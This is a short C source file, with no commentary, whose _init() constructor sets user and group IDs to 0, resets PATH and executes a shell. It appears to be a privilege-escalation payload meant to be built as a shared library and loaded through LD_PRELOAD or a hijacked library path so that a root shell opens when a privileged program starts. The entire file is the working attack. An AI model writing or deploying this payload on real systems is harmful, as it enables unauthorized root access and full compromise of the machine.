#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

void _init() {
	char* argv[2] = {"sh", NULL};

	setuid(0);
	setgid(0);
	setegid(0);

	setenv("PATH", "/usr/local/bin:/usr/bin:/bin", 1);
	execvp("sh", argv);
}
